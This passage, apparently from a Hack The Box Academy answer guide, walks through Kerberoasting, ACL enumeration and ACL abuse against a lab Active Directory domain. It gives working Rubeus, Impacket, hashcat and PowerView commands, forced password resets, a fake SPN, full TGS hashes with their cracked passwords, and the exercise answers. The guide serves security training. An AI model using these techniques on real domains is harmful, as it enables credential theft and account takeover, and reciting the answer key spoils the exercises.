$krb5tgs$23$*SAPService$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SAPService*$c10f3438e08b2ea6d1e594f86f9a3098$061ffe6405f28cf4bf3cd6e1fe62afd134b10328462bd492a2550e6c071366a8f1034f75dfb5c0c5d80ecdbbe762b1d6f2cb280b6755f7ac4cde11ddfb49bbb16ee699a4c1961f40639e6ad2927969205bfba3116bd776a344de16a08d39ab2dab2d896e7b0f6612366107209903ae458843ab68c524df206aa3af095fcbd01783e805536351926405aef89d036377c1945b7cc3769be49589e2b9fb7e7f63b2847fee13e463bc472de19d64660780f6ab7ce6d47134eefabdc3d30855daef98350d4751fbf477bc887334a628ab176eb9358580bb952cf678a0125d94d3a593eecd7105f5b16ad57f702db3e4521775beb258f898243f5667064b4a33f71cf9aa774a9afca992524fcb58e9dbe1fca4ee46afcf6c40a1575c025946bf4e2291235c8caf231df3397989f2fd89c5ede65f37ded7cf322da856c42124d0ce2e03fc027fba6e89b1a4afdc54b7ff6d7991d2e472da24fddd8a2b89cbbee52d30e9af6f8fd6c394041528fcbbec69376525899b1bd2e952ca223291ff1c4c4d00cfe84396da672f58f902fce25329b3b9463a1d08e14dfc18f80093f7be5abeea94ce854499a156e24e134fe8ea0b63770fa905722359af51315a1651032a2a87ead7b2e744eb6686d3ff2239c328f67d8602cf0b4c7817554dba4c5575b4488d72a6d8ff0c60d7fd1840b8c47d450d78031d6c07bd3071f9f0cba9cd10571445a193e47b60ee8cbc7ed36cc174a77071b0cb1322e86530c17e64112f9cf6de670959b90bdafa6722960bb51abbe3e27ded9da7bedd7a70799ae7c3449f0569e9886aa22aa493f071c318f8d34c8fb36fabe3c8a623409918a89e6c71ef39572cba37abfa53539a7414313dbdee2f9e87fab3c97fa7e2b5207b542b46962502f3edf63d287288872a66917d63d2bd956a7e9b946f4ffab08cb6ef9ba5c1de13b2cbb9e696eaa386726e0911c8b66d9d65907b800ee01883d441ad728d2874dcd52bc3e8cba0e7210290d7b08d638accc55d3d75192eac482912dfedda54c5f7cc9d2f29652d42cda8fbb8140b50eee6bacdc5faf8672c377f24569cee7b80f21940f4e180a311a1779aefe2440ced6792d8c37fd3524f523feb6884ff2026ea4c1ec03cb916a5256301d923907fca468634ddc9bdce6f4f6dd2818db41c8509b3c9150cc2ec6fb6f998ba65c6676ce098e40a83d559cb6a244bd9dd1f9dd2cbe9fc76fe8a1ddbe40ae27945f8cc59362212b58ced3a2f6c9c18dd794c25f1bd26365685d49cdc28cec473ac567a94a3fef3ca3284ddff83b5346e090f583517b89fff81cf3367471676ec76180e24b0c203c67c55cffac581ad0e079ad8ef0be3d59b1b678d09990852f79f08e48cfdd8d262137bc48486ead79a2e41c4933bf08e5852b143c6250b6a282195b8147565b0a726:!SapperFi2

<SNIP>
```

Answer: `!SapperFi2`

# Kerberoasting - from Linux

## Question 2

### "What powerful local group on the Domain Controller is the SAPService user a member of?"

Using the same SSH connection established in the previous question, students need to run `GetUserSPNs.py` and specify the `SAPService` user (with its password being `!SapperFi2`); students will know from the output that the powerful local group is `Account Operators`:

Code: shell

```shell
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService
```

```
┌─[htb-student@ea-attack01]─[~]
└──╼ $GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/SAPService

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

Password:!SapperFi2

<SNIP>

SAPService/srv01.inlanefreight.local SAPService CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL 2022-04-18 14:40:02.959792  2022-06-20 04:26:34.537896
```

Answer: `Account Operators`

# Kerberoasting - from Windows

## Question 1

### "What is the name of the service account with the SPN 'vmware/inlanefreight.local'?"

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run PowerShell as Administrator.

Afterward, students need to run `setspn.exe`, and from its output, they will find out that the name of the service account is `svc_vmwaresso`:

Code: powershell

```powershell
setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1
```

```
PS C:\Windows\system32> .\setspn.exe -Q */* | Select-String -Pattern "vmware/inlanefreight.local" -Context 1

  CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
>       vmware/inlanefreight.local
```

Answer: `svc_vmwaresso`

# Kerberoasting - from Windows

## Question 2

### "Crack the password for this account and submit it as your answer."

Using the same `xfreerdp` session from the previous question, students need to navigate to `C:\Tools\` from within `PowerShell`:

Code: powershell

```powershell
cd C:\Tools\
```

```
PS C:\Windows\system32> cd C:\Tools\
```

Students then need to use `Rubeus` to perform a `Kerbroasting` attack:

Code: shell

```shell
.\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /user:svc_vmwaresso /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : svc_vmwaresso
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svc_vmwaresso)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : svc_vmwaresso
[*] DistinguishedName      : CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : vmware/inlanefreight.local
[*] PwdLastSet             : 4/5/2022 12:32:46 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6F5B30F5AEF2CC451EF05F858D22A0C7$528519E555FD635CCE1FC3F60EDFF8249918716226B5F6BC3F7DB5239FE865A3607A962027CCB25446D108FE0978E1671CD9E4490C83DA4A5B0E7CCA4F2638E8E3C6C4E9FCF82A89B68D62618C4CE23E6210A5483D940D8E9924D6AF7A6D1173D5C773366E377E95A0EFE852FECC41831740F334B1AF96EFA980CD5DCB06ED4C4D7AFCE055E2055A16C3C40291F96CCC362CC3664237FFB1FB94160988A69BB07C68984EA94C8F54A76E4DE3FB77A8FCC85AF4AEF0C5BF549865E4E6054BC93F302CEF7B4AC8E453A8D68FBB3C3EF147830E0F9B50897CE5E18B6DD0D51F027F4F01AFFEF7F76FC51241143E9EF62782A98F77DBEE985F45C0B865946F9D27BD15B83E98781A17A934C68AE3A3E8F419FC9F7DFF049FF78DCD44F0C96757E3AC2EE5E34D5CC377AFD42E32D295C8C10804515B27D89E38DEED49F2854ABDDD01EB8B270A19F6AF4CC76C1A4D8101B771A43FA30CDC5399CDD10046090863383A82AF3A8C0D90B0D31BB89FF1B19956149C3D3C3DC4099B318F360DCF65337A8B291FC0B8A0A03B1CB12F3BB4C67D090BF8B16BF3C9EF5E70B7E714722FA65BC562D0F5737F50E1BA8F79C881B8ECC73129930A9D37DB8F339139DD8F9C26DBFDAF7C94A2F448C5251F243B4492C943A0FCA48B63A3DE244824CBF9607380869BD09ED400DB5E0AFC40699D6DE91C975EBCBC1BA8460361A79CA0BD39BE2974C4A8C44BD077D13E799A8CEE3D0136C183933EBEF4D11ADD28452C40593CBE3F56ED512826FAED80287EB643E7929E30E4813698E3F63CA794BAAAEC1DF832B60F9CA32A559C14F1F02EAD2A0C0191573E4BB2FBBB57CFA49AF073A9A2F67DD3C21026DDE9E10792D0CE091154365F808FF8A4C3D9E0FB8734B556C96C6BCB466C34832368C74955C4B8093CD593C51D491467818644AE8B1F30BD49529C489A9837BF80B18F3DC56E535553320250E3658F4814DD4F5E4780A526103857FDD95B386A820173CAE7217C7B3B88A3518DDECA172E2B665734DB079142717FBCAA1EC447312ECA0D4F5A17613364636C182C6BC316BDAAFB6C5B38020EA8A1CB2383FE884CB97808FF1FD1413F3871A8119D79095C47B309685E74915737E58FD8BB6D1E98A1344758CFFB20163D3A5E0FD414079657CE39C2751195D0E225714C6126E13C16E71731C610F42408B17623452C7C912EC1D738E6462463401A62629474F98FB0E0CB4B15082DA6DAB92A349907CC370BFD1EE7A3A7369287B6E33A05D141EE11B4539060622FD795B2E5F8AE687AB57FACD420475E251F7BFAE7EA1789033BA1B4D91F8FBB60A2EBB6917DF0B2E41FECC429A533983995CF5627C259FF0E4AE3C6ECD7574A94E32719E5BCD364D1EE7AD37DF688EFCE9F1D91371A86E6264D4CD776884389448EE2DAD1CDDC0B1390ECFC6EFCE6895838B0A7EC807AEAC52D422E284B6514A91D5721F9B22A6956FE8ACC76BC7FF89FB1C343B6EEDF17EAFBD1DFB4AC46518CFB9B16364639049356C6F3F1D56676B7B6358CF8AF21F0632B01DED739FF2F42B4C36BF87790E505C7CCD618A480EFE45485E5C4E253567E4206AB132180F1A5DF143097CE23D3C6CD05CAED17CFFFFF50F20FDAE44A3A445B781109B6EC012DD3FC4B885555FCF932BD13616FCA61
```

Thereafter, students need to save the hash into a text file in `Pwnbox`/`PMVPN` and then use `Hashcat` to crack it, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `Virtual01`:

Code: shell

```shell
sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sudo hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*svc_vmwaresso$INLANEFREIGHT.LOCAL$vmware/inlanefreight.local@INLANEFREIGHT.LOCAL*$6f5b30f5aef2cc451ef05f858d22a0c7$528519e555fd635cce1fc3f60edff8249918716226b5f6bc3f7db5239fe865a3607a962027ccb25446d108fe0978e1671cd9e4490c83da4a5b0e7cca4f2638e8e3c6c4e9fcf82a89b68d62618c4ce23e6210a5483d940d8e9924d6af7a6d1173d5c773366e377e95a0efe852fecc41831740f334b1af96efa980cd5dcb06ed4c4d7afce055e2055a16c3c40291f96ccc362cc3664237ffb1fb94160988a69bb07c68984ea94c8f54a76e4de3fb77a8fcc85af4aef0c5bf549865e4e6054bc93f302cef7b4ac8e453a8d68fbb3c3ef147830e0f9b50897ce5e18b6dd0d51f027f4f01affef7f76fc51241143e9ef62782a98f77dbee985f45c0b865946f9d27bd15b83e98781a17a934c68ae3a3e8f419fc9f7dff049ff78dcd44f0c96757e3ac2ee5e34d5cc377afd42e32d295c8c10804515b27d89e38deed49f2854abddd01eb8b270a19f6af4cc76c1a4d8101b771a43fa30cdc5399cdd10046090863383a82af3a8c0d90b0d31bb89ff1b19956149c3d3c3dc4099b318f360dcf65337a8b291fc0b8a0a03b1cb12f3bb4c67d090bf8b16bf3c9ef5e70b7e714722fa65bc562d0f5737f50e1ba8f79c881b8ecc73129930a9d37db8f339139dd8f9c26dbfdaf7c94a2f448c5251f243b4492c943a0fca48b63a3de244824cbf9607380869bd09ed400db5e0afc40699d6de91c975ebcbc1ba8460361a79ca0bd39be2974c4a8c44bd077d13e799a8cee3d0136c183933ebef4d11add28452c40593cbe3f56ed512826faed80287eb643e7929e30e4813698e3f63ca794baaaec1df832b60f9ca32a559c14f1f02ead2a0c0191573e4bb2fbbb57cfa49af073a9a2f67dd3c21026dde9e10792d0ce091154365f808ff8a4c3d9e0fb8734b556c96c6bcb466c34832368c74955c4b8093cd593c51d491467818644ae8b1f30bd49529c489a9837bf80b18f3dc56e535553320250e3658f4814dd4f5e4780a526103857fdd95b386a820173cae7217c7b3b88a3518ddeca172e2b665734db079142717fbcaa1ec447312eca0d4f5a17613364636c182c6bc316bdaafb6c5b38020ea8a1cb2383fe884cb97808ff1fd1413f3871a8119d79095c47b309685e74915737e58fd8bb6d1e98a1344758cffb20163d3a5e0fd414079657ce39c2751195d0e225714c6126e13c16e71731c610f42408b17623452c7c912ec1d738e6462463401a62629474f98fb0e0cb4b15082da6dab92a349907cc370bfd1ee7a3a7369287b6e33a05d141ee11b4539060622fd795b2e5f8ae687ab57facd420475e251f7bfae7ea1789033ba1b4d91f8fbb60a2ebb6917df0b2e41fecc429a533983995cf5627c259ff0e4ae3c6ecd7574a94e32719e5bcd364d1ee7ad37df688efce9f1d91371a86e6264d4cd776884389448ee2dad1cddc0b1390ecfc6efce6895838b0a7ec807aeac52d422e284b6514a91d5721f9b22a6956fe8acc76bc7ff89fb1c343b6eedf17eafbd1dfb4ac46518cfb9b16364639049356c6f3f1d56676b7b6358cf8af21f0632b01ded739ff2f42b4c36bf87790e505c7ccd618a480efe45485e5c4e253567e4206ab132180f1a5df143097ce23d3c6cd05caed17cfffff50f20fdae44a3a445b781109b6ec012dd3fc4b885555fcf932bd13616fca61:Virtual01
```

Answer: `Virtual01`

# Access Control List (ACL) Abuse Primer

## Question 1

### "What type of ACL defines which security principals are granted or denied access to an object? (one word)"

`Discretionary Access Control List` (`DACL`) defines which security principals are granted or denied access to an object:

![[HTB Solutions/CAPE/z. images/73c4896843858a8413a2c42b8d51525e_MD5.jpg]]

Answer: `DACL`

# Access Control List (ACL) Abuse Primer

## Question 2

### "Which ACE entry can be leveraged to perform a targeted Kerberoasting attack?"

The `GenericAll` ACE entry can be leveraged to perform a `targeted Kerberoasting` attack:

![[HTB Solutions/CAPE/z. images/8b890d5261562ad5a514aedf7ef62056_MD5.jpg]]

Answer: `GenericAll`

# ACL Enumeration

## Question 1

### "What is the rights GUID for User-Force-Change-Password?"

The `rightsGuid` for `User-Force-Change-Password` is `00299570-246d-11d0-a768-00aa006e0529`:

![[HTB Solutions/CAPE/z. images/4e5e9c100aefb4328c8149cf997b8e85_MD5.jpg]]

Answer: `00299570-246d-11d0-a768-00aa006e0529`

# ACL Enumeration

## Question 2

### "What flag can we use with PowerView to show us the ObjectAceType in a human-readable format during our enumeration?"

The `ResolveGUIDs` flag can be used to show `ObjectAceType` in a human-readable format:

![[HTB Solutions/CAPE/z. images/d3fcb6f82d67ca72686fc0cbde010ec2_MD5.jpg]]

Answer: `ResolveGUIDs`

# ACL Enumeration

## Question 3

### "What privileges does the user damundsen have over the Help Desk Level 1 group?"

The `damundsen` user has `GenericWrite` privileges over the "Help Desk Level 1" group:

![[HTB Solutions/CAPE/z. images/44601c56ddbccd58677231d2cda5c874_MD5.jpg]]

Answer: `GenericWrite`

# ACL Enumeration

## Question 4

### "Using the skills learned in this section, enumerate the ActiveDirectoryRights that the user forend has over the user dpayne (Dagmar Payne)."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory and import `PowerView.ps1`:

Code: powershell

```powershell
cd C:\Tools\
Import-Module .\PowerView.ps1
```

```
PS C:\Windows\system32> cd C:\Tools\
PS C:\Tools> Import-Module .\PowerView.ps1
```

Students then need to use `Convert-NameToSid` on `forend`:

Code: powershell

```powershell
$sid = Convert-NameToSid forend
```

```
PS C:\Tools> $sid = Convert-NameToSid forend
```

Now, students need to enumerate the domain for objects that `forend` has rights over; students will find out that the `ActiveDirectoryRights` the user `forend` has over the user `dpayne` is `GenericAll`:

Code: powershell

```powershell
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
```

```
PS C:\Tools> Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN=Dagmar Payne,OU=HelpDesk,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             : S-1-5-21-3842939050-3880317879-2865463114-1152
ActiveDirectoryRights : GenericAll
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983551
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-5614
AceType               : AccessAllowed
AceFlags              : ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit
PropagationFlags      : None
AuditFlags            : None
```

Answer: `GenericAll`

# ACL Enumeration

## Question 5

### "What is the ObjectAceType of the first right that the forend user has over the GPO Management group? (two words in the format Word-Word)"

Using the same `xfreerdp` session from the previous question, students need to use the `Get-DomainObjectAcl` Cmdlet; students will find out that `ObjectAceType` of the first right that `forend` has over the GPO Management group is `Self-Membership`:

Code: powershell

```powershell
Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_SecurityIdentifier -eq $sid | select ObjectAceType}
```

```
PS C:\Tools> Get-DomainObjectAcl -ResolveGUIDs -Identity "GPO Management" | ? {$_SecurityIdentifier -eq $sid | select ObjectAceType}

AceQualifier           : AccessAllowed
ObjectDN               : CN=GPO Management,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
ActiveDirectoryRights  : Self
ObjectAceType          : Self-Membership
ObjectSID              : S-1-5-21-3842939050-3880317879-2865463114-4046
InheritanceFlags       : ContainerInherit
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-3842939050-3880317879-2865463114-5614
AccessMask             : 8
AuditFlags             : None
IsInherited            : False
AceFlags               : ContainerInherit
InheritedObjectAceType : All
OpaqueLength           : 0
```

Answer: `Self-Membership`

# ACL Abuse Tactics

## Question 1

### "Work through the examples in this section to gain a better understanding of ACL abuse and performing these skills hands-on. Set a fake SPN for the adunn account, Kerberoast the user, and crack the hash using Hashcat. Submit the account's cleartext password as your answer."

After spawning the target machine, students first need to connect to it with `xfreerdp` using the credentials `htb-student:Academy_student_AD!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:Academy_student_AD!
```

```
┌─[us-academy-1]─[10.10.14.12]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ xfreerdp /v:10.129.149.107 /u:htb-student /p:Academy_student_AD!

<SNIP>

Certificate details for 10.129.149.107:3389 (RDP-Server):
	Common Name: ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Subject:     CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Issuer:      CN = ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL
	Thumbprint:  2e:a1:7e:ac:38:d1:b5:99:8b:30:0b:ca:1a:2a:dd:0d:f3:c0:f6:79:e4:98:89:b8:08:66:d8:7f:98:c0:f2:37
```

When prompted with the "Computer Access Policy" message, students need to click on "OK". Once they access the spawned target machine, students need to close `Server Manager`. Then, students need to run `PowerShell` as Administrator.

Subsequently, students need to navigate to the `C:\Tools\` directory:

Code: powershell

```powershell
cd C:\Tools\
```

```
PS C:\Windows\system32> cd C:\Tools\
```

Students then need to create a `PSCredential Object` for the user `wley`:

Code: powershell

```powershell
$SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

```
PS C:\Tools> $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
PS C:\Tools> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
```

Afterward, students need to create a `SecureString` object:

Code: powershell

```powershell
$damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

```
PS C:\Tools> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
```

Students then need to import `PowerView.ps1`:

Code: powershell

```powershell
Import-Module .\PowerView.ps1
```

```
PS C:\Tools> Import-Module .\PowerView.ps1
```

Subsequently, students need to use `Set-DomainUserPassword`:

Code: powershell

```powershell
Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
```

```
PS C:\Tools> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Set-DomainUserPassword] Attempting to set the password for user 'damundsen'
VERBOSE: [Set-DomainUserPassword] Password for user 'damundsen' successfully reset
```

Students need to create a `PSCredential Object` for the user `damundsen`:

Code: powershell

```powershell
$SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
$Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

```
PS C:\Tools> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\Tools> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
```

Then, students need to add `damundsen` to the "Help Desk Level 1" group:

Code: powershell

```powershell
Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
```

```
PS C:\Tools> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

VERBOSE: [Get-PrincipalContext] Using alternate credentials
VERBOSE: [Add-DomainGroupMember] Adding member 'damundsen' to group 'Help Desk Level 1'
```

Students need to confirm that `damundsen` was added to the group successfully:

Code: powershell

```powershell
Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"
```

```
PS C:\Tools> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | Select-String -Pattern "damundsen"

@{MemberName=damundsen}
```

Now, students need to create a fake SPN for the `adunn` account:

Code: powershell

```powershell
Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
```

```
PS C:\Tools> Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose

VERBOSE: [Get-Domain] Using alternate credentials for Get-Domain
VERBOSE: [Get-Domain] Extracted domain 'INLANEFREIGHT' from -Credential
VERBOSE: [Get-DomainSearcher] search base: LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL
VERBOSE: [Get-DomainSearcher] Using alternate credentials for LDAP connection
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=adunn)(name=adunn)(displayname=adunn))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'notahacker/LEGIT' for object 'adunn'
```

Subsequently, students need to `Kerbroast` the `adunn` account:

Code: powershell

```powershell
.\Rubeus.exe kerberoast /user:adunn /nowrap
```

```
PS C:\Tools> .\Rubeus.exe kerberoast /user:adunn /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target User            : adunn
[*] Target Domain          : INLANEFREIGHT.LOCAL
[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=adunn)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 1

[*] SamAccountName         : adunn
[*] DistinguishedName      : CN=Angela Dunn,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] ServicePrincipalName   : notahacker/LEGIT
[*] PwdLastSet             : 3/1/2022 11:29:08 AM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*adunn$INLANEFREIGHT.LOCAL$notahacker/LEGIT@INLANEFREIGHT.LOCAL*$D4CAC857ED8F6B9BD4DF91E0DCA95AB1$B5B1908355B367E199B8CC4D6E34F6C83C7C49318DA7F3F8EC5342D025081C8A4B25B07C898F4A787A9B27342FBE0ADAC91DCBA6850E17452F5B6FD7599CE32AD5DA3F1C93A3B7DBB37D45941C3682A6BF301CC503D95063580B73EEA3C2DC11130C0DA7D9B4F3908B5D5EE3609B1C2CFD3050EC225F8774D86F92676A8209A875F3F7AE9C991628741FC93A727A2C4684181038A586328DF02E7F68C67E8CEE4E948A6FB57C3AB7419A24811E7E95BC1801BA5F70BB0A6464F6A9B9C9351D7A3C4259074B35E4FB82797957F34A314C3E6D0DE4C96A0BB52E8678686460742B10B8A1A25D0E2953B4712253CED0D13DAB9AFD8ABA8B4B338364F923F89C9167FE76C37F7527B8DDFD4C0BBFA53BE552B11272A81DF74D033D9B4FE9BDFA3296EFDD9E3301CBC8293401FCFF3B7694E8339D56C9E4BE5EBDE1DAD8706E25DD05E2851A1749235A3785658971A692B4F1740A69D2D2F66FA763D551ECBFEFFEB8FC54951FC756430C1E550FD0DD8F6900D2AF5BF5D381AC77454ACDB04779FCD2BDA3597D0B7C6A1E7A4C06D1637E81B3810A763086D69E8DF0F2D6E56B020EDA4CAB7EE4F3D61253529AC3F17C546FC6E5EEE484F8343BCC2D35A9406B93B64F6D31B5A649EAD1C9B6BC71DB2EC82CFE5DC77285CD5941DA79111A0D97EFE049270E4D470209FD92AA7331A7CAF734BE5D834C0D6E4F6BD23C9F7556008F7BCA7291567B4C3D9270AB3E190531D221029277E85D785B7D3850D8A9B03A03EAF7B6E1BB0FFA4EB476F433D032EA993EED03A14227BB4879B4FD76B579799CF7CB093EBE27B7CC21A92451E43C274CF26161BCFEA1DFCA8249F6D91FF7CF4CF33384EF1969409B65D5290B0991F9D34866CD0F38F0DF37E858CF78FFF6A4C1E5A0C84E8CC2E2340D7A5FBC61F3B836CDC7D7909279F1CBDBE84DD069808E1BFC7CD01CC9449B73705611FBFC5DDCCAA9CC308B2591B1AD9BB428956A4EB7A88B54273A5008D6F52A65A036D283111D539C2D19EE7611EE1822F1749E6173876D9107086C6A93265AB49ED9D463B76F03F579C8E99E9AB5899C5FA0D29BC7B73180444D101F7BA048E8309AED360D933CFF20561E5AF5D3F2F1049448D1C4BE2FF341992C9BF0A9232C2FEF51AAE507306B7B46DEC98652ECED93F787CBAD674F8B2ACC7909C914E995729FB476CA02C4FF90D9C146ADD22DB762BC183C00514B234032DF753C73FCD74B28A18EDA9516F2300D634E551828DEB8ECD26C14FFB8A6D9EAFBEAE9732E4E2DD767FC50CC7CD3CAF10C0DFB2FF3D9836CB79F9DD886EE7C95E85A75B1A70FB32C8527E99C3055CAEE0775F7375C00B1A207802F368981DD16197718884C48AEFC47CEAF0E46413CAAD45AF4F5D8478F65485E62A5655ABC9B35A38E24BDD8A426B0F1AC208DFEF8239E2EAB3C43B26FF4925B3FD6EB85C294D733EFF97E9DB6E50C0D0B398744B74A998FC01083DF41D7F6C26CF9F203E5ED0F7BE33E76EBAE2D27D4A282289B8718CE76E03DF0549005875111957FA0A28B85A869DD18F9774850DEC55142876391B3EC293EFADB2D32808CA89C91090DA1A8E569F50F7EDBF0036DBE732E776CED446EAB9704A1DE14C3BA17898381165852AE928A01FD158C4C77368B73A47FD3F6BF8A1884C09D
```

Students now need to save the hash into a file in `Pwnbox`/`PMVPN` and then crack it using `Hashcat`, utilizing hashmode 13100; students will find out that the plaintext password of the cracked hash is `SyncMaster757`:

Code: shell

```shell
hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
```

```
┌─[us-academy-1]─[10.10.14.135]─[htb-ac413848@pwnbox-base]─[~]
